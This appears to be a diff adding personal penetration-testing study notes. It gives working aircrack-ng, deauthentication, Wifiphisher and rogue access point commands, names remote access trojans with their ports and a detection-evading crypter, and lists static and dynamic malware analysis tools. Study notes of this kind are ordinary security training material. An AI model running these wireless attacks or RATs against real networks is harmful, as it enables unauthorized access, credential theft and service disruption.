@@ -1,0 +1,102 @@
+Wireless Penetration Testing: 
+1. Airmon-ng
+iwconfig
+airmon‐ng start wlan0
+airodump‐ng wlan0mon
+airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon
+sudo aireplay-ng  --deauth <no of packets> -a <Access Point MAC Address>  -c <DEVICE MAC Address> <Adapter name>
+aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass*.cap
+or 
+aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt pass*.cap
+#ARP Replay Request
+aireplay-ng -3 -b <<BSSID>> -h << Source MAC Address>> wlan0mon
+
+
+Wordlist
+
+https://weakpass.com/&#x20;
+https://github.com/danielmiessler/SecLists/tree/master/Pass words/WiFi-WPA
+https://labs.nettitude.com/blog/rocktastic/
+https://github.com/kennyn510/wpa2-wordlists
+
+Netsurveyor - Find Wifi Networks In Range
+WASH - wash -i wlan0mon
+
+Wifiphisher
+apt-get install libnl-3-dev libnl-genl-3-dev
+apt-get install libssl-dev
+cd roguehostapd
+python setup.py install
+cd wifiphisher
+python3 setup.py install
+wifiphisher --force-hostapd
+
+Fern Wifi Cracker
+fern-wifi-cracker
+
+
+CREATE_AP -  Rogue Access Point
+
+sudo apt-get install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables bettercap
+make install
+create_ap <<wireless adapter name>> <<internet interface name >> <<Fake Access Point Name>>
+sudo bettercap –X -I<<Wireless Interface Name>> -S NONE --proxy --no-discovery.
+
+
+Malware Threats
+1.Trojan
+i.njRAT (5552)
+ii. Swayzcryptor GUI  #prevents from detection
+iii. Theefrat (9871, 6703, FTP 2968)  #client and server files
+iv. ProRAT
+v. HTTP RAT
+
+2. Virus
+i.  JPS Virus Macker #Click Right arrow to change password of victim.
+
+3. Static
+i.Hybrid
+ii. BinText  #string search. File pos, mem pos, ID , Text
+iii. PEid   #packaging and obfuscation. Entry point, EP Section, File Offset, First Bytes,Linker Info, Subsystem.
+iv. Detect It Easy #ELF Files. Entry Point, Base Address
+Go to File Info for Entropy, Entry Point.Hash Info 
+v.PE Explorer #Portable Executable Information. Header Info , Number of Sections, OS Versions, Number Symbols, Magic, Entry Point Address, Linker Version, Image Base, Trailing Array.
+Section Header Information.
+vi. Dependency Walker.  #DLL, Identify Fidyle
+vii. IDA   #Malware Disassembly. Programming Language Used, APIs, Hex Value, File Structure. Flowcharts.
+OllyDbg  #Malware Disassembly.View --> Log Data to get Entry Points. Threads, Memory Maps , Executables.
+viii. Ghidra - #Malware Disassambly.Address Size, Language ID , Processor, MD5, SHA256, Compiler, DLL
+
+4. Dynamic: 
+
+1. TCPView, CurrPorts  #Port Monitoring
+2. Process Monitor  #Process Monitoring. Gives PID, Operation, Path, Result And Details.
+3. Reg Organizer  #Registry Monitor
+Tools -> Registry Snapshots  -> Create Snapshot
+Install Application
+Compare with the current registry.
+4. Windows Service Manager  #Windows Service Monitor
+5. Autoruns #Startup Programs
+Logon Tab.
+
+WinPatrol #Delete Startup Service.
+
+6. Mirekusoft Install Monitor  #Installation Monitor
+7. PA File Sight  - Files And Folder Monitoring. 
+i.In Machine 1 Install.
+ii. In Machine 2 Install, but only select satellite options and enter IP of first machine:8000, stop and start satellite service
+iii. Create notepad file
+iv. In Machine 1 --> Inventory collector --> Apply --> Run Now
+v. Add New Monitor --> File Sight --> Directory to monitor --> Check Fire Action--> Audit File Activity --> Actions
+New Action List  --> Action List  --> Add --> Any option --> <<
+vi. File Sight Configurations --> File Activities  --> Check Existing Files and Ignore.
+vii. Watch Node Run Now
+viii. In machine 2, save notepad and activity recorded
+
+
+8. DriverView - #Device Driver Monitoring, Information about all drivers.
+DriverReviver - #Finds out of date drivers and update it.
+
+9. DNSQuerySniffer - #DNS Monitoring
+Select WinPCap
+
